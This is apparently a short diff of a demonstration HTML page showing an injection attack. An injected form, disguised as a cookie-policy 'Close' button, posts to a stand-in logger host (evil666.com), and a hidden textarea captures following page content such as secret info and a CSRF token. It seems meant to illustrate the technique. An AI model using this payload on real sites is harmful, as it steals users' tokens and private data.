@@ -4,10 +4,10 @@
 <h1> some title here </h1><br>
 There is a page<br>
 here is the broken input:<input name="test" value="hack   ">injection goes here
+<!-- attack vector starts here -->
 <form action="http://evil666.com/logger.php" method="post">
    please click here if you accept cookie policy: <input type="submit" value="Close" class="submitButton"><br>
-   some hidden textarea:<br>
-    <textarea style="visibility:hidden" name="confirmationText">
+   some hidden textarea:<textarea style="visibility:hidden" name="confirmationText">
 
 Suppose we have some secret info here<br>
 or even more info here like CSRF token:<br>
